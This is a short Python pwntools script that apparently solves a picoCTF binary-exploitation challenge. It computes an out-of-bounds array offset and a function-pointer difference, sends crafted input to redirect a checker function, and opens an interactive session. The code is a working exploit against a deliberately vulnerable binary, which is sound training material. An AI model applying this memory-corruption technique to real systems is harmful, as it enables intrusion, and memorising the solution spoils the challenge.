import pwn

if pwn.args.REMOTE:
    io = pwn.remote("saturn.picoctf.net", 49815)
else:
    io = pwn.process("./vuln")

check_addr = 0x0804c040
fun_addr   = 0x0804c080

offset         = (check_addr - fun_addr) // 4
easy_checker   = 0x80492fc
hard_checker   = 0x8049436
checker_offset = easy_checker - hard_checker

story = b"A" * 20 + b"%"

io.sendlineafter(b">>", story)
io.recvuntil(b"10")       
io.sendline(f"{offset} {checker_offset}".encode())

io.interactive()
